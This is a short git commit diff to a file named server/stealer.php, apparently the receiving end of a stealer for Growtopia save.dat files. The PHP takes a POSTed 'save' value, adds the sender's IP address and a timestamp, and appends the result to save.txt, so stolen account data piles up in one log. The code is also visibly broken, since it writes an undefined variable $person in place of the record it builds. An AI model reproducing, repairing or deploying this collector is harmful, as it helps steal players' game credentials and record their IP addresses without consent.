535afe8542c30164992a542b0d26f14815d286b1
Growtopia Noobs <growtopianoobs@gmail.com>
2016-10-18 16:57:58 +0200

    Update stealer.php
    Testing of saving multiple save.dats at once + some other stuff.

--- server/stealer.php
+++ server/stealer.php
@@ -1,5 +1,7 @@
 <?php
-	$myfile = fopen("save.txt", "w");
+	/*$myfile = fopen("save.txt", "w");
 	fwrite($myfile, $_POST["save"]);
-	fclose($myfile);
+	fclose($myfile);*/
+	$saveVal = $_POST["save"] . "; " . $_SERVER['REMOTE_ADDR'] . "; " . date('Y/m/d H:i:s') . "\n";
+	file_put_contents("save.txt", $person, FILE_APPEND | LOCK_EX);
 ?>
